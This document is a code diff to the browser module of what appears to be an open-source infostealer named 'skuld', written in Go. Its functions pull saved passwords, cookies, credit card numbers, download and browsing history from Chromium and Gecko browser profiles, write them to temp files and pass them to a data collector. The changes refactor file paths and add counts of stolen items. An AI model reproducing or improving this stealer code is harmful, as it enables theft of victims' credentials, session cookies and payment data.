@@ -2,12 +2,13 @@ package browsers
 
 import (
 	"fmt"
-	"github.com/hackirby/skuld/utils/fileutil"
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/collector"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/hackirby/skuld/utils/fileutil"
+	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
 func ChromiumSteal() []Profile {
@@ -137,33 +138,47 @@ func GeckoSteal() []Profile {
 }
 
 func Run(dataCollector *collector.DataCollector) {
-	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
-	os.MkdirAll(tempDir, os.ModePerm)
-
-	defer os.RemoveAll(tempDir)
-
 	var profiles []Profile
 	profiles = append(profiles, ChromiumSteal()...)
 	profiles = append(profiles, GeckoSteal()...)
 
 	if len(profiles) == 0 {
+		// Even if no profiles found, send empty info
+		dataCollector.AddData("browsers", map[string]interface{}{
+			"Status": "No browser profiles found",
+		})
 		return
 	}
+
+	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
+	os.MkdirAll(tempDir, os.ModePerm)
+	defer os.RemoveAll(tempDir)
+
+	totalLogins := 0
+	totalCookies := 0
+	totalCreditCards := 0
+	totalHistory := 0
+	totalDownloads := 0
 
 	for _, profile := range profiles {
 		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
 			continue
 		}
-		os.MkdirAll(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name), os.ModePerm)
+		
+		profileDir := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name)
+		os.MkdirAll(profileDir, os.ModePerm)
 
 		if len(profile.Logins) > 0 {
-			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "logins.txt"), fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
+			loginsFile := filepath.Join(profileDir, "logins.txt")
+			fileutil.AppendFile(loginsFile, fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
 			for _, login := range profile.Logins {
-				fileutil.AppendFile(fmt.Sprintf("%s\\%s\\%s\\%s\\logins.txt", tempDir, profile.Browser.User, profile.Browser.Name, profile.Name), fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
+				fileutil.AppendFile(loginsFile, fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password))
 			}
+			totalLogins += len(profile.Logins)
 		}
 
 		if len(profile.Cookies) > 0 {
+			cookiesFile := filepath.Join(profileDir, "cookies.txt")
 			for _, cookie := range profile.Cookies {
 				var expires string
 				if cookie.ExpireDate == 0 {
@@ -179,33 +194,48 @@ func Run(dataCollector *collector.DataCollector) {
 					host = "TRUE"
 				}
 
-				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "cookies.txt"), fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
+				fileutil.AppendFile(cookiesFile, fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value))
 			}
+			totalCookies += len(profile.Cookies)
 		}
 
 		if len(profile.CreditCards) > 0 {
-			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
+			ccFile := filepath.Join(profileDir, "credit_cards.txt")
+			fileutil.AppendFile(ccFile, fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
 			for _, cc := range profile.CreditCards {
-				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
+				fileutil.AppendFile(ccFile, fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
 			}
+			totalCreditCards += len(profile.CreditCards)
 		}
 
 		if len(profile.Downloads) > 0 {
-			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
+			downloadsFile := filepath.Join(profileDir, "downloads.txt")
+			fileutil.AppendFile(downloadsFile, fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
 			for _, download := range profile.Downloads {
-				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
+				fileutil.AppendFile(downloadsFile, fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
 			}
+			totalDownloads += len(profile.Downloads)
 		}
 
 		if len(profile.History) > 0 {
-			fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
+			historyFile := filepath.Join(profileDir, "history.txt")
+			fileutil.AppendFile(historyFile, fmt.Sprintf("%-70s %-70s", "Title", "URL"))
 			for _, history := range profile.History {
-				fileutil.AppendFile(filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
+				fileutil.AppendFile(historyFile, fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
 			}
+			totalHistory += len(profile.History)
 		}
-
 	}
 
 	// Add browsers data to collector
+	browsersInfo := map[string]interface{}{
+		"TotalProfiles":    len(profiles),
+		"TotalLogins":      totalLogins,
+		"TotalCookies":     totalCookies,
+		"TotalCreditCards": totalCreditCards,
+		"TotalHistory":     totalHistory,
+		"TotalDownloads":   totalDownloads,
+	}
+	dataCollector.AddData("browsers", browsersInfo)
 	dataCollector.AddDirectory("browsers", tempDir, "browsers_data")
 }
